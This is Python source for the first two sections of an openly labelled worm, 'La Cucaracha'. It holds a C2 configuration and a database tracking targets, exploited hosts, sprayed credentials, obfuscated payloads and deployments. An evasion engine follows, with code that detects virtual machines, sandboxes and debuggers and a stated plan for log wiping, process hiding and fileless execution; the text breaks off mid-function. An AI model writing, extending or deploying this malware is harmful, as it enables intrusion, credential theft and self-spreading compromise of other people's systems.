#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LACUCARACHA SECTION A — Imports + Config + Database + Utils               ║
║  La Cucaracha Worm — Complete Foundation                                   ║
║                                                                              ║
║  by 🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

Concatenation order: A → B → C → ...
This section provides ALL imports, configuration constants, the Database class,
and utility functions used by the entire worm.
"""

# =============================================================================
# Standard Library Imports
# =============================================================================
import argparse
import base64
import binascii
import ctypes
import datetime
import enum
import glob
import hashlib
import hmac
import http.server
import ipaddress
import json
import logging
import math
import mmap
import os
import queue
import random
import re
import select
import shlex
import shutil
import socket
import sqlite3
import struct
import string
import subprocess
import sys
import tempfile
import threading
import time
import traceback
import urllib.parse
import urllib.request
import uuid
import xml.etree.ElementTree as ET
import zipfile
from dataclasses import dataclass, field, asdict
from datetime import datetime as dt
from enum import Enum
from pathlib import Path
from typing import Any, Callable, Dict, List, Optional, Set, Tuple, Union
from urllib.parse import urlparse

# ─── RedLinux Module Integration ────────────────────────────────────────────
import integrator

# Resource monitoring — try psutil, fall back to /proc/stat
try:
    import psutil
    _HAS_PSUTIL = True
except ImportError:
    _HAS_PSUTIL = False

# ─── Resource monitoring helpers (CPU, RAM, Disk) ───────────────────────────
def _system_cpu_pct() -> float:
    """Get CPU usage % — using psutil or /proc/stat fallback."""
    if _HAS_PSUTIL:
        return psutil.cpu_percent(interval=0.5)
    # /proc/stat fallback
    try:
        with open("/proc/stat") as f:
            line = f.readline()
        parts = line.strip().split()
        if len(parts) >= 5 and parts[0] == "cpu":
            total = sum(int(x) for x in parts[1:8])
            idle = int(parts[4])
            return 100.0 * (1.0 - idle / total) if total > 0 else 0.0
    except Exception:
        pass
    return 0.0

def _system_mem_pct() -> float:
    """Get memory usage %."""
    if _HAS_PSUTIL:
        return psutil.virtual_memory().percent
    try:
        with open("/proc/meminfo") as f:
            meminfo = {}
            for line in f:
                parts = line.split(":")
                if len(parts) == 2:
                    key = parts[0].strip()
                    val_str = parts[1].strip().split()[0]
                    try:
                        meminfo[key] = int(val_str)
                    except ValueError:
                        pass
        total = meminfo.get("MemTotal", 1)
        free = meminfo.get("MemAvailable", meminfo.get("MemFree", 1))
        return 100.0 * (1.0 - free / total) if total > 0 else 0.0
    except Exception:
        return 0.0

def _system_disk_mb() -> float:
    """Get available disk space in MB."""
    if _HAS_PSUTIL:
        return psutil.disk_usage("/").free / (1024 * 1024)
    try:
        st = os.statvfs("/")
        return (st.f_frsize * st.f_bavail) / (1024 * 1024)
    except Exception:
        return 9999.0

def _system_should_throttle() -> bool:
    """Return True if system resources are too strained for full operation."""
    return _system_cpu_pct() > 85.0 or _system_mem_pct() > 85.0 or _system_disk_mb() < 100.0

def _system_resource_report() -> Dict[str, float]:
    """Return dict of cpu%, mem%, disk_mb."""
    return {"cpu_pct": _system_cpu_pct(), "mem_pct": _system_mem_pct(), "disk_mb": _system_disk_mb()}

# =============================================================================
# Conditional (Optional) Imports
# =============================================================================
HAVE_REQUESTS = False
HAVE_PARAMIKO = False
HAVE_SCAPY = False
HAVE_CRYPTOGRAPHY = False
HAVE_PAHO_MQTT = False
HAVE_STEM = False
HAVE_SOCKS = False
HAVE_PSUTIL = False
HAVE_PYMONGO = False
HAVE_REDIS = False
HAVE_MYSQL = False
HAVE_PSYCOPG2 = False
HAVE_PYCURL = False
HAVE_I2P = False
HAVE_DNS = False
HAVE_SMBCLIENT = False
HAVE_PYCRYPTODOME = False
HAVE_TELEGRAM = False
HAVE_STEALTH = False

try:
    import telegram
    HAVE_TELEGRAM = True
except ImportError:
    pass

try:
    import stealth  # type: ignore
    HAVE_STEALTH = True
except ImportError:
    pass

try:
    import paramiko
    HAVE_PARAMIKO = True
except ImportError:
    pass

def _lazy_scapy():
    """Import scapy on first use — avoids hanging module-level import."""
    global HAVE_SCAPY
    if HAVE_SCAPY:
        return True
    try:
        # Import into module globals so functions see them
        import scapy.all as _s
        g = globals()
        for _attr in ('IP','ICMP','TCP','UDP','Ether','ARP','DNS',
                        'DNSQR','DNSRR','Raw','send','sr1','srloop',
                        'sniff','conf','fragment','ls','RandShort'):
            if hasattr(_s, _attr):
                g[_attr] = getattr(_s, _attr)
        HAVE_SCAPY = True
        return True
    except ImportError:
        return False

HAVE_SCAPY = False  # lazy — call _lazy_scapy() before use

try:
    from cryptography.fernet import Fernet
    HAVE_CRYPTOGRAPHY = True
except ImportError:
    pass

try:
    import paho.mqtt.client as mqtt
    HAVE_PAHO_MQTT = True
except ImportError:
    pass

try:
    from stem.control import Controller
    import stem
    HAVE_STEM = True
except ImportError:
    pass

try:
    import socks
    HAVE_SOCKS = True
except ImportError:
    pass

try:
    import psutil
    HAVE_PSUTIL = True
except ImportError:
    pass

try:
    import pymongo
    HAVE_PYMONGO = True
except ImportError:
    pass

try:
    import redis
    HAVE_REDIS = True
except ImportError:
    pass

try:
    import mysql.connector
    HAVE_MYSQL = True
except ImportError:
    pass

try:
    import psycopg2
    HAVE_PSYCOPG2 = True
except ImportError:
    pass

try:
    import i2p
    HAVE_I2P = True
except ImportError:
    pass

try:
    import dns.resolver
    HAVE_DNS = True
except ImportError:
    pass

try:
    import smbclient
    HAVE_SMBCLIENT = True
except ImportError:
    pass

try:
    from Cryptodome.Cipher import AES
    HAVE_PYCRYPTODOME = True
except ImportError:
    pass

try:
    import telegram
    HAVE_TELEGRAM = True
except ImportError:
    pass

# Necronomicon — Web RCE Port-to-CVE Dispatch Module
try:
    from necronomicon import Necronomicon
    HAVE_NECRONOMICON = True
except ImportError:
    HAVE_NECRONOMICON = False

# =============================================================================
# Configuration Constants
# =============================================================================

# C2 server
C2_HOST = "127.0.0.1"
C2_PORT = 10001
C2_HTTP = f"http://{C2_HOST}:{C2_PORT}"

# Static authentication token — override from environment
STATIC_TOKEN = os.environ.get("STATIC_TOKEN", "CHANGE_ME_DEFAULT_TOKEN")

# Paths
WORK_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_DIR = os.path.join(WORK_DIR, "logs")
DB_PATH = os.path.join(WORK_DIR, "worm_mesh.db")
PAYLOAD_DIR = f"{WORK_DIR}/payloads"

# Version
WORM_VERSION = "2.0.0-la-cucaracha"

# =============================================================================
# Logging Setup
# =============================================================================

log = logging.getLogger("LaCucaracha")

def setup_logger(
    name: str = "LaCucaracha",
    level: int = logging.INFO,
    log_file: Optional[str] = None,
) -> logging.Logger:
    """Configure and return a logger with consistent formatting."""
    logger = logging.getLogger(name)
    logger.setLevel(level)
    logger.handlers.clear()

    fmt = logging.Formatter(
        "%(asctime)s [%(levelname)s] %(name)s: %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )

    # Console handler
    ch = logging.StreamHandler(sys.stdout)
    ch.setLevel(level)
    ch.setFormatter(fmt)
    logger.addHandler(ch)

    # File handler (optional)
    if log_file:
        try:
            os.makedirs(os.path.dirname(log_file) or ".", exist_ok=True)
            fh = logging.FileHandler(log_file)
            fh.setLevel(level)
            fh.setFormatter(fmt)
            logger.addHandler(fh)
        except (OSError, PermissionError):
            pass

    return logger

# Initialize logging at module load time — configure ROOT logger for all sub-loggers (WormMesh, LaCucaracha, worm.secG, etc.)
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
    stream=sys.stdout,
    force=True,
)

# =============================================================================
# Crypto / Key Utility Functions
# =============================================================================

def _generate_key(seed: str = "") -> Tuple[bytes, str]:
    """Derive a 32-byte AES key and a Fernet-compatible key from a seed string.

    Returns:
        (aes_key: bytes, fernet_key_b64: str)
    """
    raw = hashlib.sha3_256(seed.encode() if seed else os.urandom(32)).digest()
    aes_key = raw  # 32 bytes for AES-256
    fernet_b64 = base64.urlsafe_b64encode(raw)
    return aes_key, fernet_b64.decode()


def _aes_encrypt(plaintext: str, key: bytes) -> str:
    """AES-256-CBC encrypt plaintext and return base64 ciphertext.

    Falls back to Fernet if cryptography.fernet is available, else XOR.
    """
    if HAVE_CRYPTOGRAPHY:
        try:
            f = Fernet(base64.urlsafe_b64encode(key[:32]).decode())
            return f.encrypt(plaintext.encode()).decode()
        except Exception:
            pass
    # Fallback: simple XOR encryption
    iv = os.urandom(16)
    data = plaintext.encode()
    encrypted = bytes([data[i] ^ key[i % len(key)] for i in range(len(data))])
    return base64.b64encode(iv + encrypted).decode()


def _aes_decrypt(ciphertext_b64: str, key: bytes) -> str:
    """Reverse of _aes_encrypt."""
    if HAVE_CRYPTOGRAPHY:
        try:
            f = Fernet(base64.urlsafe_b64encode(key[:32]).decode())
            return f.decrypt(ciphertext_b64.encode()).decode()
        except Exception:
            pass
    # Fallback XOR decryption
    try:
        raw = base64.b64decode(ciphertext_b64)
        iv = raw[:16]
        encrypted = raw[16:]
        decrypted = bytes([encrypted[i] ^ key[i % len(key)] for i in range(len(encrypted))])
        return decrypted.decode()
    except Exception as exc:
        log.error(f"_aes_decrypt failed: {exc}")
        return ""


def _polymorphic_hash(content: str) -> str:
    """Generate a polymorphic hash stub for code obfuscation."""
    return hashlib.sha3_256((content + str(random.random())).encode()).hexdigest()[:16]


def _rand_ip() -> str:
    """Generate a random IPv4 address string."""
    return f"{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"


def _rand_port() -> int:
    """Generate a random high port."""
    return random.randint(1024, 65535)


def _current_timestamp() -> int:
    """Return current Unix timestamp in seconds."""
    return int(time.time())


# =============================================================================
# Database Schema
# =============================================================================

DB_SCHEMA = """
CREATE TABLE IF NOT EXISTS nodes (
    id              TEXT PRIMARY KEY,
    hostname        TEXT,
    ip              TEXT NOT NULL,
    port            INTEGER DEFAULT 22,
    os              TEXT,
    arch            TEXT,
    version         TEXT,
    public_key      TEXT,
    status          TEXT DEFAULT 'active',
    first_seen      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL,
    checkins        INTEGER DEFAULT 1,
    latency_ms      REAL DEFAULT 0.0,
    tags            TEXT DEFAULT '[]',
    mesh_peers      TEXT DEFAULT '[]',
    encryption_key  TEXT
);

CREATE TABLE IF NOT EXISTS targets (
    id              TEXT PRIMARY KEY,
    ip              TEXT NOT NULL,
    port            INTEGER DEFAULT 22,
    protocol        TEXT DEFAULT 'tcp',
    service         TEXT,
    banner          TEXT,
    os_guess        TEXT,
    confidence      REAL DEFAULT 0.0,
    first_seen      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL,
    scan_source     TEXT DEFAULT 'masscan',
    scanned         INTEGER DEFAULT 0,
    exploited       INTEGER DEFAULT 0,
    notes           TEXT
);

CREATE TABLE IF NOT EXISTS credentials (
    id              TEXT PRIMARY KEY,
    target_ip       TEXT NOT NULL,
    port            INTEGER DEFAULT 22,
    username        TEXT NOT NULL,
    password        TEXT,
    service         TEXT DEFAULT 'ssh',
    source          TEXT DEFAULT 'spray',
    validated       INTEGER DEFAULT 0,
    first_seen      INTEGER NOT NULL,
    last_seen       INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS payloads (
    id              TEXT PRIMARY KEY,
    variant         TEXT NOT NULL,
    content         TEXT NOT NULL,
    hash            TEXT NOT NULL,
    size_bytes      INTEGER,
    obfuscation     TEXT,
    created_at      INTEGER NOT NULL,
    deployed_count  INTEGER DEFAULT 0,
    peer_spread     INTEGER DEFAULT 0
);

CREATE TABLE IF NOT EXISTS deployments (
    id              TEXT PRIMARY KEY,
    target_id       TEXT,
    target_ip       TEXT NOT NULL,
    method          TEXT NOT NULL,
    payload_id      TEXT,
    payload_variant TEXT,
    status          TEXT DEFAULT 'pending',
    started_at      INTEGER,
    completed_at    INTEGER,
    error_msg       TEXT,
    FOREIGN KEY (target_id) REFERENCES targets(id),
    FOREIGN KEY (payload_id) REFERENCES payloads(id)
);

CREATE TABLE IF NOT EXISTS mesh_state (
    key             TEXT PRIMARY KEY,
    value           TEXT NOT NULL,
    updated_at      INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS operations_log (
    id              INTEGER PRIMARY KEY AUTOINCREMENT,
    timestamp       INTEGER NOT NULL,
    level           TEXT DEFAULT 'INFO',
    source          TEXT,
    message         TEXT NOT NULL
);

CREATE TABLE IF NOT EXISTS icmp_tasks (
    id              TEXT PRIMARY KEY,
    target_ip       TEXT NOT NULL,
    os_hint         TEXT,
    ttl             INTEGER,
    priority        INTEGER DEFAULT 0,
    status          TEXT DEFAULT 'pending',
    created_at      INTEGER NOT NULL,
    processed_at    INTEGER
);

CREATE TABLE IF NOT EXISTS docker_hosts (
    id              TEXT PRIMARY KEY,
    ip              TEXT NOT NULL,
    hostname        TEXT,
    docker_version  TEXT,
    container_count INTEGER DEFAULT 0,
    container_ids   TEXT DEFAULT '[]',
    bridge_network  TEXT DEFAULT 'docker0',
    icmp_bypassed   INTEGER DEFAULT 0,
    last_check      INTEGER NOT NULL,
    created_at      INTEGER NOT NULL
);

CREATE TABLE IF NOT EXISTS pmtu_poisoned (
    id              TEXT PRIMARY KEY,
    ip              TEXT NOT NULL UNIQUE,
    kernel_version  TEXT,
    packets_sent    INTEGER DEFAULT 0,
    last_poison     INTEGER NOT NULL,
    created_at      INTEGER NOT NULL
);

CREATE INDEX IF NOT EXISTS idx_targets_ip ON targets(ip);
CREATE INDEX IF NOT EXISTS idx_targets_exploited ON targets(exploited);
CREATE INDEX IF NOT EXISTS idx_deployments_status ON deployments(status);
CREATE INDEX IF NOT EXISTS idx_nodes_status ON nodes(status);
CREATE INDEX IF NOT EXISTS idx_credentials_target ON credentials(target_ip);
"""


# =============================================================================
# Database Class
# =============================================================================

class Database:
    """SQLite-backed persistence layer for the worm mesh.

    Provides full CRUD for targets, nodes, credentials, payloads,
    deployments, mesh_state, operations_log, icmp_tasks, docker_hosts,
    and pmtu_poisoned tables.
    """

    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path) if os.path.dirname(db_path) else ".", exist_ok=True)
        self._conn: Optional[sqlite3.Connection] = None
        self._lock = threading.Lock()

    # ---- Connection management ------------------------------------------------

    @property
    def conn(self) -> sqlite3.Connection:
        if self._conn is None:
            self._conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self._conn.row_factory = sqlite3.Row
            self._conn.execute("PRAGMA journal_mode=WAL")
            self._conn.execute("PRAGMA busy_timeout=5000")
            self._init_schema()
        return self._conn

    def _init_schema(self) -> None:
        self._conn.executescript(DB_SCHEMA)
        self._conn.commit()

    def close(self) -> None:
        if self._conn:
            self._conn.close()
            self._conn = None

    # ---- Generic helpers ------------------------------------------------------

    def execute(self, sql: str, params: tuple = ()) -> sqlite3.Cursor:
        with self._lock:
            return self.conn.execute(sql, params)

    def executemany(self, sql: str, params: List[tuple]) -> sqlite3.Cursor:
        with self._lock:
            return self.conn.executemany(sql, params)

    def commit(self) -> None:
        self.conn.commit()

    def log(self, message: str, level: str = "INFO", source: str = "system") -> None:
        ts = _current_timestamp()
        self.execute(
            "INSERT INTO operations_log (timestamp, level, source, message) VALUES (?, ?, ?, ?)",
            (ts, level, source, message),
        )
        self.commit()
        getattr(log, level.lower(), log.info)(f"[{source}] {message}")

    # ---- Targets --------------------------------------------------------------

    def add_target(
        self,
        ip: str,
        port: int = 22,
        protocol: str = "tcp",
        service: str = "",
        banner: str = "",
        scan_source: str = "masscan",
        os_guess: str = "",
        confidence: float = 0.0,
    ) -> str:
        existing = self.execute(
            "SELECT id, last_seen FROM targets WHERE ip = ? AND port = ?", (ip, port)
        ).fetchone()
        if existing:
            self.execute(
                "UPDATE targets SET last_seen = ?, scanned = scanned + 1 WHERE id = ?",
                (_current_timestamp(), existing["id"]),
            )
            self.commit()
            return existing["id"]
        tid = str(uuid.uuid4())
        now = _current_timestamp()
        self.execute(
            """INSERT INTO targets (id, ip, port, protocol, service, banner, os_guess,
               confidence, first_seen, last_seen, scan_source)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (tid, ip, port, protocol, service, banner, os_guess, confidence, now, now, scan_source),
        )
        self.commit()
        return tid

    def get_targets(
        self,
        unscanned_only: bool = False,
        unexploited_only: bool = False,
        exploited_only: bool = False,
        limit: int = 100,
    ) -> List[Dict]:
        sql = "SELECT * FROM targets WHERE 1=1"
        params: List[Any] = []
        if unscanned_only:
            sql += " AND scanned = 0"
        if unexploited_only:
            sql += " AND exploited = 0"
        if exploited_only:
            sql += " AND exploited = 1"
        sql += " ORDER BY last_seen DESC LIMIT ?"
        params.append(limit)
        rows = self.execute(sql, tuple(params)).fetchall()
        return [dict(r) for r in rows]

    def mark_exploited(self, target_id: str) -> None:
        self.execute(
            "UPDATE targets SET exploited = 1, last_seen = ? WHERE id = ?",
            (_current_timestamp(), target_id),
        )
        self.commit()

    def target_count(self) -> int:
        return self.execute("SELECT COUNT(*) AS c FROM targets").fetchone()["c"]

    # ---- Nodes ----------------------------------------------------------------

    def add_node(
        self,
        ip: str,
        hostname: str = "",
        port: int = 22,
        os_name: str = "",
        arch: str = "",
        public_key: str = "",
        encryption_key: str = "",
    ) -> str:
        existing = self.execute(
            "SELECT id, checkins FROM nodes WHERE ip = ? AND port = ?", (ip, port)
        ).fetchone()
        if existing:
            self.execute(
                """UPDATE nodes SET last_seen = ?, checkins = checkins + 1,
                   status = 'active' WHERE id = ?""",
                (_current_timestamp(), existing["id"]),
            )
            self.commit()
            return existing["id"]
        nid = str(uuid.uuid4())
        now = _current_timestamp()
        self.execute(
            """INSERT INTO nodes (id, hostname, ip, port, os, arch, public_key,
               status, first_seen, last_seen, encryption_key)
               VALUES (?, ?, ?, ?, ?, ?, ?, 'active', ?, ?, ?)""",
            (nid, hostname, ip, port, os_name, arch, public_key, now, now, encryption_key),
        )
        self.commit()
        return nid

    def get_active_nodes(self) -> List[Dict]:
        return [dict(r) for r in self.execute(
            "SELECT * FROM nodes WHERE status = 'active' ORDER BY last_seen DESC"
        ).fetchall()]

    def mark_node_dead(self, node_id: str) -> None:
        self.execute(
            "UPDATE nodes SET status = 'dead', last_seen = ? WHERE id = ?",
            (_current_timestamp(), node_id),
        )
        self.commit()

    def node_count(self) -> int:
        return self.execute(
            "SELECT COUNT(*) AS c FROM nodes WHERE status = 'active'"
        ).fetchone()["c"]

    # ---- Credentials ----------------------------------------------------------

    def store_credential(
        self,
        target_ip: str,
        username: str,
        password: str,
        port: int = 22,
        service: str = "ssh",
        source: str = "spray",
    ) -> str:
        existing = self.execute(
            "SELECT id FROM credentials WHERE target_ip = ? AND username = ? AND password = ? AND port = ?",
            (target_ip, username, password, port),
        ).fetchone()
        if existing:
            return existing["id"]
        cid = str(uuid.uuid4())
        now = _current_timestamp()
        self.execute(
            """INSERT INTO credentials (id, target_ip, port, username, password, service,
               source, first_seen, last_seen)
               VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)""",
            (cid, target_ip, port, username, password, service, source, now, now),
        )
        self.commit()
        return cid

    def get_credentials(self, target_ip: Optional[str] = None) -> List[Dict]:
        if target_ip:
            rows = self.execute(
                "SELECT * FROM credentials WHERE target_ip = ? ORDER BY last_seen DESC", (target_ip,)
            ).fetchall()
        else:
            rows = self.execute(
                "SELECT * FROM credentials ORDER BY last_seen DESC"
            ).fetchall()
        return [dict(r) for r in rows]

    # ---- Payloads -------------------------------------------------------------

    def store_payload(
        self,
        variant: str,
        content: str,
        phash: str,
        size_bytes: int,
        obfuscation: str,
    ) -> str:
        pid = str(uuid.uuid4())
        self.execute(
            """INSERT INTO payloads (id, variant, content, hash, size_bytes,
               obfuscation, created_at)
               VALUES (?, ?, ?, ?, ?, ?, ?)""",
            (pid, variant, content, phash, size_bytes, obfuscation, _current_timestamp()),
        )
        self.commit()
        return pid

    def get_payloads(self, variant: Optional[str] = None) -> List[Dict]:
        if variant:
            rows = self.execute(
                "SELECT * FROM payloads WHERE variant = ? ORDER BY created_at DESC", (variant,)
            ).fetchall()
        else:
            rows = self.execute(
                "SELECT * FROM payloads ORDER BY created_at DESC"
            ).fetchall()
        return [dict(r) for r in rows]

    def increment_deployed(self, payload_id: str, peer: bool = False) -> None:
        col = "peer_spread" if peer else "deployed_count"
        self.execute(f"UPDATE payloads SET {col} = {col} + 1 WHERE id = ?", (payload_id,))
        self.commit()

    # ---- Deployments ----------------------------------------------------------

    def add_deployment(
        self,
        target_ip: str,
        method: str,
        payload_id: str = "",
        payload_variant: str = "",
        target_id: str = "",
    ) -> str:
        did = str(uuid.uuid4())
        self.execute(
            """INSERT INTO deployments (id, target_id, target_ip, method, payload_id,
               payload_variant, status, started_at)
               VALUES (?, ?, ?, ?, ?, ?, 'pending', ?)""",
            (did, target_id, target_ip, method, payload_id, payload_variant, _current_timestamp()),
        )
        self.commit()
        return did

    def complete_deployment(self, deploy_id: str, success: bool, error_msg: str = "") -> None:
        status = "completed" if success else "failed"
        self.execute(
            "UPDATE deployments SET status = ?, completed_at = ?, error_msg = ? WHERE id = ?",
            (status, _current_timestamp(), error_msg, deploy_id),
        )
        self.commit()

    def get_deployments(
        self,
        status: Optional[str] = None,
        target_ip: Optional[str] = None,
        limit: int = 100,
    ) -> List[Dict]:
        sql = "SELECT * FROM deployments WHERE 1=1"
        params: List[Any] = []
        if status:
            sql += " AND status = ?"
            params.append(status)
        if target_ip:
            sql += " AND target_ip = ?"
            params.append(target_ip)
        sql += " ORDER BY started_at DESC LIMIT ?"
        params.append(limit)
        return [dict(r) for r in self.execute(sql, tuple(params)).fetchall()]

    # ---- Mesh state -----------------------------------------------------------

    def get_mesh_value(self, key: str, default: str = "") -> str:
        row = self.execute(
            "SELECT value FROM mesh_state WHERE key = ?", (key,)
        ).fetchone()
        return row["value"] if row else default

    def set_mesh_value(self, key: str, value: str) -> None:
        self.execute(
            """INSERT INTO mesh_state (key, value, updated_at)
               VALUES (?, ?, ?)
               ON CONFLICT(key) DO UPDATE SET value = excluded.value, updated_at = excluded.updated_at""",
            (key, value, _current_timestamp()),
        )
        self.commit()

    # ---- ICMP Tasks -----------------------------------------------------------

    def add_icmp_task(
        self,
        target_ip: str,
        os_hint: str = "",
        ttl: int = 0,
        priority: int = 0,
    ) -> str:
        tid = str(uuid.uuid4())
        self.execute(
            """INSERT INTO icmp_tasks (id, target_ip, os_hint, ttl, priority, created_at)
               VALUES (?, ?, ?, ?, ?, ?)""",
            (tid, target_ip, os_hint, ttl, priority, _current_timestamp()),
        )
        self.commit()
        return tid

    def get_pending_icmp_tasks(self, limit: int = 3) -> List[Dict]:
        rows = self.execute(
            "SELECT * FROM icmp_tasks WHERE status='pending' ORDER BY priority DESC LIMIT ?",
            (limit,),
        ).fetchall()
        return [dict(r) for r in rows]

    # ---- Stats ----------------------------------------------------------------

    def stats(self) -> Dict:
        return {
            "targets": self.execute("SELECT COUNT(*) AS c FROM targets").fetchone()["c"],
            "targets_scanned": self.execute(
                "SELECT COUNT(*) AS c FROM targets WHERE scanned > 0"
            ).fetchone()["c"],
            "targets_exploited": self.execute(
                "SELECT COUNT(*) AS c FROM targets WHERE exploited = 1"
            ).fetchone()["c"],
            "nodes_active": self.execute(
                "SELECT COUNT(*) AS c FROM nodes WHERE status = 'active'"
            ).fetchone()["c"],
            "nodes_total": self.execute("SELECT COUNT(*) AS c FROM nodes").fetchone()["c"],
            "payloads": self.execute("SELECT COUNT(*) AS c FROM payloads").fetchone()["c"],
            "deployments_total": self.execute(
                "SELECT COUNT(*) AS c FROM deployments"
            ).fetchone()["c"],
            "deployments_success": self.execute(
                "SELECT COUNT(*) AS c FROM deployments WHERE status = 'completed'"
            ).fetchone()["c"],
            "deployments_failed": self.execute(
                "SELECT COUNT(*) AS c FROM deployments WHERE status = 'failed'"
            ).fetchone()["c"],
        }


# =============================================================================
# Section A End Marker
# =============================================================================
# End of la_section_A.py
#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║  LACUCARACHA SECTION B — C2MultiChannel + OPSECEngine                      ║
║  La Cucaracha Worm — Multi-Channel C2 with Total Stealth                   ║
║                                                                              ║
║  by 🇭🇷PhonkAlphabet                                                         ║
╚══════════════════════════════════════════════════════════════════════════════╝

Concatenation order: A → B → C → ...
This section provides C2 communication channels (HTTP, DNS, ICMP, WebSocket,
Telegram, Tor) and the OPSECEngine for anti-forensics, anti-debugging, process
hiding, domain fronting, and fileless execution.
"""

# =============================================================================
# Imports — Section B builds on Section A's namespace
# =============================================================================

import hashlib
import hmac
import json
import logging
import os
import random
import socket
import struct
import subprocess
import sys
import threading
import time
import uuid
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set, Tuple

log = logging.getLogger("LaCucaracha.B")

# =============================================================================
# OPSECEngine — Total Stealth Layer
# =============================================================================

class OPSECEngine:
    """Anti-forensics, anti-debugging, process hiding, and fileless execution.

    Implements CKAB Total Stealth:
      - Anti-VM / sandbox detection
      - Anti-debugger / tracer detection
      - Process hiding via prctl, /proc overlay, and listdir hook
      - Forensic trace cleaning (bash history, syslog, wtmp, .pyc caches)
      - Fileless execution (memfd, ctypes, exec)
      - Domain fronting
      - TOR / DoH routing
      - Traffic obfuscation (padding, jitter, dummy traffic)
    """

    def __init__(self):
        self._tor_available = False
        self._i2p_available = False
        self._doh_available = False
        self._hidden = False
        self._init_proxies()

    # ---- Initialization -------------------------------------------------------

    def _init_proxies(self) -> None:
        """Attempt to connect to TOR SOCKS5, I2P SAM, and DoH resolvers."""
        # TOR
        try:
            if HAVE_SOCKS:
                s = socks.socksocket()
                s.set_proxy(socks.SOCKS5, "127.0.0.1", 9050)
                s.settimeout(3)
                s.connect(("check.torproject.org", 80))
                s.close()
                self._tor_available = True
        except Exception:
            pass

        # I2P SAM
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)
            s.connect(("127.0.0.1", 7656))
            s.close()
            self._i2p_available = True
        except Exception:
            pass

        # DoH — try a simple DNS query via HTTPS
        try:
            if HAVE_DNS:
                resolver = dns.resolver.Resolver(configure=False)
                resolver.nameservers = ["1.1.1.1", "8.8.8.8", "9.9.9.9"]
                answers = resolver.resolve("google.com", "A", lifetime=2)
                self._doh_available = len(answers) > 0
        except Exception:
            pass

    # ---- Anti-VM / Sandbox Detection -----------------------------------------

    def anti_vm_check(self) -> Dict[str, Any]:
        """Run comprehensive VM/sandbox detection checks.

        Returns dict with 'is_vm' bool and 'indicators' list.
        """
        indicators: List[str] = []

        # Check common VM MAC prefixes
        vm_macs = [
            "00:05:69",  # VMware
            "00:0C:29",  # VMware
            "00:1C:14",  # VMware
            "00:50:56",  # VMware
            "00:15:5D",  # Hyper-V
            "00:1E:67",  # Hyper-V
            "08:00:27",  # VirtualBox
            "00:03:FF",  # VirtualBox
            "52:54:00",  # QEMU/KVM
            "02:42:AC",  # Docker
        ]
        try:
            with open("/sys/class/net/eth0/address", "r") as f:
                mac = f.read().strip().upper()
                for vm_mac in vm_macs:
                    if mac.startswith(vm_mac):
                        indicators.append(f"VM MAC prefix: {vm_mac}")
                        break
        except (FileNotFoundError, PermissionError):
            pass

        # Check for VM-specific files
        vm_files = [
            "/proc/vmware/version",
            "/proc/xen/version",
            "/dev/kvm",
            "/dev/vboxdrv",
            "/dev/vmmon",
            "/proc/self/status",
        ]
        for vf in vm_files:
            if os.path.exists(vf):
                try:
                    for vm_sig in ["vbox", "vmware", "qemu", "kvm", "xen"]:
                        if vm_sig in vf.lower():
                            indicators.append(f"VM file present: {vf}")
                            break
                except Exception:
                    pass

        # Check for VM processes
        try:
            if HAVE_PSUTIL:
                vm_procs = ["vmtoolsd", "VBoxService", "xenstore", "qemu-ga"]
                for p in psutil.process_iter(["name"]):
                    if p.info["name"] and p.info["name"].lower() in vm_procs:
                        indicators.append(f"VM process: {p.info['name']}")
        except Exception:
            pass

        # Check CPU vendor / hypervisor flag
        try:
            with open("/proc/cpuinfo", "r") as f:
                cpuinfo = f.read().lower()
                for hv in ["hypervisor", "qemu", "kvm", "vbox", "vmware"]:
                    if hv in cpuinfo:
                        indicators.append(f"CPU hypervisor flag: {hv}")
                        break
        except (FileNotFoundError, PermissionError):
            pass

        # Check Docker /.dockerenv
        if os.path.exists("/.dockerenv"):
            indicators.append("Docker environment detected")

        # Check common sandbox indicators (small disk, small RAM)
        try:
            if HAVE_PSUTIL:
                mem = psutil.virtual_memory()
                if mem.total < 2 * 1024**3:  # < 2GB RAM
                    indicators.append(f"Low memory: {mem.total / 1024**3:.1f}GB")
                disk = psutil.disk_usage("/")
                if disk.total < 20 * 1024**3:  # < 20GB disk
                    indicators.append(f"Small disk: {disk.total / 1024**3:.1f}GB")
        except Exception:
            pass

        is_vm = len(indicators) >= 2

        if is_vm:
            log.warning(f"VM/sandbox detected: {', '.join(indicators)}")
        else:
            log.info("Anti-VM check passed — no sandbox indicators")

        return {"is_vm": is_vm, "indicators": indicators}

    # ---- Anti-Debugging ------------------------------------------------------

    def anti_debug(self) -> Dict[str, Any]:
        """Detect debuggers, tracers, and analysis environments.

        Returns dict with 'debug_detected' bool and 'checks' list.
        """
        checks: List[str] = []
        debug_detected = False

        # Check for ptrace / TracerPid
        try:
            with open("/proc/self/status", "r") as f:
                for line in f:
                    if line.startswith("TracerPid:"):
                        pid = line.split(":")[1].strip()
                        if pid != "0":
                            checks.append(f"TracerPid={pid} (being traced)")
                            debug_detected = True
                        break
        except (FileNotFoundError, PermissionError):
            pass

        # Check for gdb / lldb / strace processes
        try:
            if HAVE_PSUTIL:
                dbg_procs = ["gdb", "lldb", "strace", "ltrace", "ftrace",
                              "valgrind", "perf", "oprofile", "rr"]
                for p in psutil.process_iter(["name"]):
                    if p.info["name"] and p.info["name"].lower() in dbg_procs:
                        checks.append(f"Debug tool: {p.info['name']} (PID {p.pid})")
                        debug_detected = True
